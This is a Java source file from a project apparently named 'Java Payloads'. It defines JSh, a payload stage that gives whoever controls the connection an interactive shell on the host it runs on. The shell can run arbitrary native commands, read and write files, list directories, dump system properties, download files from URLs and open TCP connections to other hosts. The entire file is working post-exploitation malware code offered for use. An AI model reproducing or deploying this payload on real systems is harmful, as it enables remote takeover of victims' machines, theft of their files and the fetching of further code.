/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stage;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

public class JSh implements Stage, Runnable {

	// each job is an Object[] to avoid a pure data class
	// job[0] = name (String)
	// job[1] = raw object (Socket or Process or Stream) for closing
	// job[2] = OutputStream to forward user input to
	// job[3..length-1] = JshStreamForwarders to redirect output
	private final List jobs = new ArrayList();

	private PipedOutputStream signalStream;
	private InputStream originalIn;
	private PrintStream pout;

	/**
	 * Forward data from one stream to another. Closes the input stream but not the output stream!
	 */
	private void forward(InputStream in, OutputStream out) throws IOException {
		final byte[] buf = new byte[4096];
		int len;
		while ((len = in.read(buf)) != -1) {
			out.write(buf, 0, len);
			if (in.available() == 0) {
				out.flush();
			}
		}
		in.close();
	}

	private boolean forwardEscapable(InputStream in, Object[] job) throws IOException {
		final OutputStream out = (OutputStream) job[2];
		int b;
		boolean startOfLine = true, tilde = false, interrupted = true;
		while (true) {
			if (interrupted && job.length > 3) {
				boolean allFinished = true;
				for (int i = 3; i < job.length; i++) {
					if (!((JShStreamForwarder) job[i]).isFinished()) {
						allFinished = false;
						break;
					}
				}
				if (allFinished) {
					pout.println("Finished: " + job[0]);
					return false;
				}
			}
			interrupted = false;
			if ((b = in.read()) != -1) {
				if (b == 0) {
					b = in.read();
					if (b != 0) {
						interrupted = true;
						continue;
					}
				}
				if (startOfLine && b == '~') {
					tilde = true;
				} else if (tilde && b == '&') {
					return true;
				} else if (tilde && b == '.') {
					return false;
				} else {
					if (tilde && b != '~') {
						out.write('~');
					}
					out.write(b);
					if (in.available() == 0) {
						out.flush();
					}
					tilde = false;
				}
				startOfLine = (b == '\r' || b == '\n');
			} else {
				// our control connection has died...
				return false;
			}
		}
	}

	private void handleBackgroundJob(DataInputStream in, Object[] job) throws Exception {
		pout.println("Press ~& to suspend, ~. to stop job.");
		for (int i = 3; i < job.length; i++) {
			((JShStreamForwarder) job[i]).pauseForwarding(false);
		}
		if (forwardEscapable(in, job)) {
			for (int i = 3; i < job.length; i++) {
				((JShStreamForwarder) job[i]).pauseForwarding(true);
			}
			jobs.add(job);
			pout.println("Job suspended, see 'jobs'.");
		} else {
			for (int i = 3; i < job.length; i++) {
				((JShStreamForwarder) job[i]).stopForwarding();
			}
			if (job[1] instanceof Socket) {
				((Socket) job[1]).close();
			} else if (job[1] instanceof Process) {
				((Process) job[1]).destroy();
			} else {
				((OutputStream) job[1]).close();
			}
		}
	}

	public void run() {
		try {
			try {
				int b;
				while ((b = originalIn.read()) != -1) {
					signalStream.write(b);
					if (b == 0) {
						signalStream.write(b);
					}
					if (originalIn.available() == 0) {
						signalStream.flush();
					}
				}
			} finally {
				originalIn.close();
				signalStream.close();
			}
		} catch (final Throwable ex) {
			ex.printStackTrace(pout);
		}
	}

	public void start(DataInputStream originalIn, OutputStream out, String[] parameters) throws Exception {
		this.originalIn = originalIn;
		signalStream = new PipedOutputStream();
		pout = new PrintStream(out, true);
		final DataInputStream in = new DataInputStream(new PipedInputStream(signalStream));
		final Thread copier = new Thread(this);
		copier.setDaemon(true);
		copier.start();
		final JShSignalSender ss = new JShSignalSender(signalStream, pout);
		File pwd = new File(".").getCanonicalFile();
		while (true) {
			pout.print("! ");
			// yes I know this is deprecated. but BufferedReader is way too bloated for what we need here
			String cmd = in.readLine();
			while (cmd.indexOf("\0$") != -1) {
				cmd = cmd.substring(0, cmd.indexOf("\0$")) + cmd.substring(cmd.indexOf("\0$") + 2);
			}
			if (cmd.length() == 0) {
				continue;
			}
			int pos = cmd.indexOf(' ');
			String params = "";
			if (pos != -1) {
				params = cmd.substring(pos + 1);
				cmd = cmd.substring(0, pos);
			}
			cmd = cmd.toLowerCase().intern();
			try {
				if (cmd == "info") {
					if (params.length() == 0) {
						final Enumeration e = System.getProperties().propertyNames();
						while (e.hasMoreElements()) {
							final String property = (String) e.nextElement();
							pout.println(property + "=" + System.getProperty(property));
						}
					} else {
						pout.println(params + "=" + System.getProperty(params));
					}
				} else if (cmd == "pwd") {
					pout.println(pwd.getPath());
				} else if (cmd == "cd") {
					File f = new File(pwd, params);
					if (f.exists() && f.isDirectory()) {
						pwd = f.getCanonicalFile();
					} else {
						f = new File(params);
						if (f.exists() && f.isDirectory()) {
							pwd = f.getCanonicalFile();
						} else {
							pout.println("Path not found.");
						}
					}
					pout.println(pwd.getPath());
				} else if (cmd == "ls") {
					final File[] roots = File.listRoots();
					for (int i = 0; i < roots.length; i++) {
						pout.println(roots[i].getAbsolutePath() + "\t[ROOT]");
					}
					pout.println();
					final File[] dir = pwd.listFiles();
					for (int i = 0; i < dir.length; i++) {
						pout.println(dir[i].getName() + "\t" + (dir[i].isDirectory() ? "[DIR]" : "" + dir[i].length()) + "\t" + dir[i].lastModified());
					}
				} else if (cmd == "exec") {
					Process proc;
					handleBackgroundJob(in, new Object[] { "exec " + params, proc = Runtime.getRuntime().exec(params), proc.getOutputStream(), new JShStreamForwarder(proc.getInputStream(), pout, ss), new JShStreamForwarder(proc.getErrorStream(), pout, ss) });
				} else if (cmd == "cat") {
					final FileInputStream fis = new FileInputStream(new File(pwd, params));
					forward(fis, pout);
				} else if (cmd == "wget") {
					pos = params.indexOf(' ');
					if (pos == -1) {
						pout.println("  Usage: wget <URL> <filename>");
					} else {
						final FileOutputStream fos = new FileOutputStream(new File(pwd, params.substring(pos + 1)));
						forward(new URL(params.substring(0, pos)).openStream(), fos);
						fos.close();
					}
				} else if (cmd == "telnet") {
					pos = params.indexOf(' ');
					if (pos == -1) {
						pout.println("  Usage: telnet <host> <port>");
					} else {
						Socket s;
						handleBackgroundJob(in, new Object[] { "telnet " + params, s = new Socket(params.substring(0, pos), Integer.parseInt(params.substring(pos + 1))), s.getOutputStream(), new JShStreamForwarder(s.getInputStream(), pout, ss) });
					}
				} else if (cmd == "paste") {
					FileOutputStream fos;
					handleBackgroundJob(in, new Object[] { "paste " + params, fos = new FileOutputStream(new File(pwd, params)), fos });
				} else if (cmd == "jobs") {
					if (params.length() == 0) {
						for (int i = 0; i < jobs.size(); i++) {
							pout.println((i + 1) + "\t" + ((Object[]) jobs.get(i))[0]);
						}
					} else {
						handleBackgroundJob(in, (Object[]) jobs.remove(Integer.parseInt(params) - 1));
					}
				} else if (cmd == "exit") {
					break;
				} else if (cmd == "help") {
					params = params.toLowerCase().intern();
					if (params == "info") {
						pout.println("info: show system properties.");
						pout.println("  Usage: info [property]");
					} else if (params == "pwd") {
						pout.println("pwd: show current directory.");
						pout.println("  Usage: pwd");
					} else if (params == "cd") {
						pout.println("cd: change directory.");
						pout.println("  Usage: cd <path>");
					} else if (params == "ls") {
						pout.println("ls: list directory.");
						pout.println("  Usage: ls");
					} else if (params == "exec") {
						pout.println("exec: execute native command.");
						pout.println("  Usage: exec <command>");
					} else if (params == "cat") {
						pout.println("cat: show text file.");
						pout.println("  Usage: cat <filename>");
					} else if (params == "wget") {
						pout.println("wget: download file.");
						pout.println("  Usage: wget <URL> <filename>");
					} else if (params == "telnet") {
						pout.println("telnet: create TCP connection.");
						pout.println("  Usage: telnet <host> <port>");
					} else if (params == "paste") {
						pout.println("paste: create text file.");
						pout.println("  Usage: paste <filename>");
					} else if (params == "jobs") {
						pout.println("jobs: list or continue jobs.");
						pout.println("  Usage: jobs [index]");
					} else if (params == "exit") {
						pout.println("exit: Exit JSh.");
						pout.println("  Usage: exit");
					} else {
						pout.println("help: show information about commands.");
						pout.println("  Usage: help [command]");
						pout.println();
						pout.println("Supported commands:");
						pout.println("    help   - show this help");
						pout.println("    info   - list system properties");
						pout.println("    pwd    - show current directory");
						pout.println("    cd     - change directory");
						pout.println("    ls     - list directory");
						pout.println("    exec   - execute native command");
						pout.println("    cat    - show text file");
						pout.println("    wget   - download file");
						pout.println("    telnet - create TCP connection");
						pout.println("    paste  - create text file");
						pout.println("    jobs   - list or continue jobs");
						pout.println("    exit   - Exit JSh");
						pout.println();
						pout.println("When inside an interactive command, enter ~. on a new");
						pout.println("line to exit from that command. Enter ~& to background the command.");
						pout.println("Enter ~~ to start a line with a ~ character");
					}
				} else {
					pout.println("Unknown command: " + cmd);
					pout.println("Type help for more info.");
				}
			} catch (final Exception ex) {
				ex.printStackTrace(pout);
			}
		}
		ss.terminate();
		pout.close();
	}
}